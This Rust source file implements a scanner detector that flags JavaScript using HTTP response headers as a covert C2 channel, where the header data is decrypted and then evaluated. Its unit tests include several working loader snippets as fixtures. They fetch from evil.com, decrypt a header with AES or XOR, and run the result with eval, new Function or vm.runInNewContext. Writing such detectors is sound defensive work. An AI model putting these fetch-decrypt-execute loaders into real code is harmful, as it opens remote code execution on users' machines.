//! HTTP Header C2 Detector (GW008)
//!
//! Detects code that extracts data from HTTP response headers, feeds it into
//! decryption, then executes the result — GlassWare Wave 4-5 C2 pattern.
//!
//! ## Detection Logic
//!
//! This detector emits a finding ONLY when ALL THREE conditions are present:
//!
//! 1. **HTTP header extraction**: `headers[`, `headers.get(`, `getHeader(`, combined
//!    with HTTP client usage (`http.get(`, `https.get(`, `fetch(`, `axios`).
//! 2. **Decryption**: `createDecipheriv(`, `crypto.subtle.decrypt(`, `decipher.update(`,
//!    or XOR pattern (`charCodeAt` + `^` + `String.fromCharCode` within 5 lines).
//! 3. **Dynamic execution**: `eval(`, `new Function(`, `vm.runInNewContext`, etc.
//!
//! ## Severity
//!
//! Critical — indicates potential C2 payload delivery (GlassWare Wave 4-5).

use crate::config::UnicodeConfig;
use crate::detector::Detector;
use crate::finding::{DetectionCategory, Finding, Severity};
use std::path::Path;

/// Detector for HTTP header C2 patterns (GW008)
pub struct HeaderC2Detector;

impl HeaderC2Detector {
    /// Create a new HTTP header C2 detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for HeaderC2Detector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for HeaderC2Detector {
    fn name(&self) -> &str {
        "header_c2"
    }

    fn scan(&self, path: &Path, content: &str, _config: &UnicodeConfig) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Check for all three conditions
        let has_http_header = self.detect_http_header_extraction(content);
        let has_decryption = self.detect_decryption(content);
        let has_dynamic_exec = self.detect_dynamic_execution(content);

        // Only emit finding if ALL THREE conditions are present
        if has_http_header && has_decryption && has_dynamic_exec {
            // Find the line with HTTP header access for the finding location
            let header_line = self.find_http_header_line(content).unwrap_or(1);

            let finding = Finding::new(
                &path.to_string_lossy(),
                header_line,
                1,
                0,
                '\0',
                DetectionCategory::HeaderC2,
                Severity::Critical,
                "HTTP header data extraction combined with decryption and dynamic execution — \
                 potential C2 payload delivery (GlassWare Wave 4-5)",
                "CRITICAL: This code exhibits the GlassWare C2 pattern. HTTP response headers \
                 are being used as a covert channel to deliver encrypted payloads. The data is \
                 extracted from headers, decrypted, and executed dynamically. Review the network \
                 calls and decryption logic immediately.",
            )
            .with_cwe_id("CWE-506")
            .with_reference(
                "https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode",
            );

            findings.push(finding);
        }

        findings
    }
}

impl HeaderC2Detector {
    /// Check if content contains HTTP header extraction patterns
    fn detect_http_header_extraction(&self, content: &str) -> bool {
        // Check for HTTP client usage
        let http_patterns = [
            r"\bhttp\.get\s*\(",
            r"\bhttps\.get\s*\(",
            r"\bfetch\s*\(",
            r"\baxios\.",
            r"\brequest\s*\(",
            r"\bhttps\.request\s*\(",
        ];

        let has_http_client = http_patterns
            .iter()
            .any(|pattern| regex::Regex::new(pattern).unwrap().is_match(content));

        if !has_http_client {
            return false;
        }

        // Check for header access patterns
        let header_patterns = [
            r"\bheaders\s*\[",
            r"\bheaders\.get\s*\(",
            r"\bgetHeader\s*\(",
            r"\bresponse\.headers",
            r"\bres\.headers",
        ];

        header_patterns
            .iter()
            .any(|pattern| regex::Regex::new(pattern).unwrap().is_match(content))
    }

    /// Find the line number containing HTTP header access
    fn find_http_header_line(&self, content: &str) -> Option<usize> {
        let header_patterns = [
            r"\bheaders\s*\[",
            r"\bheaders\.get\s*\(",
            r"\bgetHeader\s*\(",
            r"\bresponse\.headers",
            r"\bres\.headers",
        ];

        for (line_num, line) in content.lines().enumerate() {
            for pattern in &header_patterns {
                if regex::Regex::new(pattern).unwrap().is_match(line) {
                    return Some(line_num + 1);
                }
            }
        }

        None
    }

    /// Check if content contains decryption patterns
    fn detect_decryption(&self, content: &str) -> bool {
        // Check for crypto/decryption patterns
        let crypto_patterns = [
            r"\bcreateDecipheriv\s*\(",
            r"\bcreateDecipher\s*\(",
            r"\bcrypto\.subtle\.decrypt\s*\(",
            r"\bdecipher\.update\s*\(",
            r"\bdecipher\.final\s*\(",
            r"\b\.decrypt\s*\(",
        ];

        let has_crypto = crypto_patterns
            .iter()
            .any(|pattern| regex::Regex::new(pattern).unwrap().is_match(content));

        if has_crypto {
            return true;
        }

        // Check for XOR pattern: charCodeAt + ^ operator + String.fromCharCode within 5 lines
        self.detect_xor_pattern(content)
    }

    /// Check for XOR decryption pattern within 5 lines
    #[allow(clippy::needless_range_loop)]
    fn detect_xor_pattern(&self, content: &str) -> bool {
        let lines: Vec<&str> = content.lines().collect();

        for i in 0..lines.len() {
            let line = lines[i];

            // Check if this line has charCodeAt and XOR operator
            if line.contains("charCodeAt") && line.contains('^') {
                // Check next 5 lines for String.fromCharCode
                let end = (i + 5).min(lines.len());
                for j in i..end {
                    if lines[j].contains("String.fromCharCode") {
                        return true;
                    }
                }
            }

            // Check if this line has String.fromCharCode and XOR
            if line.contains("String.fromCharCode") && line.contains('^') {
                // Check previous 5 lines for charCodeAt
                let start = i.saturating_sub(5);
                for j in start..=i {
                    if lines[j].contains("charCodeAt") {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Check if content contains dynamic execution patterns
    fn detect_dynamic_execution(&self, content: &str) -> bool {
        let patterns = [
            r"\beval\s*\(",
            r"\bnew\s+Function\s*\(",
            r"\bvm\.runInNewContext\s*\(",
            r"\bvm\.runInThisContext\s*\(",
            r"\bchild_process\s*\+",
            r"\bexec\s*\(",
            r"\bexecSync\s*\(",
            r"\bspawn\s*\(",
        ];

        patterns
            .iter()
            .any(|pattern| regex::Regex::new(pattern).unwrap().is_match(content))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_full_c2_pattern() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const https = require('https');
            const crypto = require('crypto');

            https.get('https://evil.com/data', (res) => {
                const header = res.headers['x-update'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(header, 'hex', 'utf8');
                eval(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_detect_fetch_with_xor() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            fetch('https://evil.com/api').then(res => {
                const data = res.headers.get('x-payload');
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    result += String.fromCharCode(data.charCodeAt(i) ^ 0x42);
                }
                new Function(result)();
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
    }

    #[test]
    fn test_no_detect_http_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            fetch('https://api.example.com/data').then(res => {
                console.log(res.headers.get('content-type'));
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_crypto_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const crypto = require('crypto');
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            const decrypted = decipher.update(encrypted, 'hex', 'utf8');
            console.log(decrypted);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_eval_only() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const code = "console.log('hello')";
            eval(code);
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_express_headers() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            app.get('/api', (req, res) => {
                const contentType = req.headers['content-type'];
                res.json({ type: contentType });
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_http_crypto_no_exec() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            https.get('https://api.com', (res) => {
                const header = res.headers['x-data'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(header, 'hex', 'utf8');
                console.log(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_detect_axios_pattern() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const axios = require('axios');
            const crypto = require('crypto');
            axios.get('https://evil.com/c2').then(response => {
                const payload = response.headers['x-cmd'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const decrypted = decipher.update(payload, 'hex', 'utf8');
                eval(decrypted);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::HeaderC2);
    }

    #[test]
    fn test_detect_vm_execution() {
        let detector = HeaderC2Detector::new();
        let content = r#"
            const vm = require('vm');
            const crypto = require('crypto');
            https.get('https://c2.evil.com', (res) => {
                const header = res.headers['x-code'];
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                const code = decipher.update(header, 'hex', 'utf8');
                vm.runInNewContext(code);
            });
        "#;

        let findings = detector.scan(Path::new("test.js"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
    }
}
